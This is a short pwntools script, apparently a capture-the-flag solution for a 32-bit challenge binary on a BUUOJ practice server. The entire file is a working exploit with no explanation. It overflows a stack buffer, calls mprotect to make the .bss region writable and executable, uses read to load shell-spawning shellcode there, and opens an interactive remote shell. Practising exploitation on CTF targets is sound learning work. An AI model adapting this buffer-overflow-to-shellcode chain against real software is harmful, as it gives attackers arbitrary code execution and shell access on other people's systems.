from pwn import *

context.log_level = 'debug'

#p = process('./rop')
p = remote('node4.buuoj.cn', 27373)
elf = ELF('rop')

mprotect = elf.sym['mprotect']
read = elf.sym['read']
main = elf.sym['main']

bss = 0x080EB000

payload = b'a' * ( 0xc + 4 ) + p32(mprotect) + p32(main) + p32(bss) + p32(0x2000) + p32(4+2+1)

p.sendline(payload)

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')

payload = b'a' * ( 0xc + 4 ) + p32(read) + p32(bss) + p32(0) + p32(bss) + p32(0x100)

p.sendline(payload)
p.sendline(shellcode)

p.interactive()
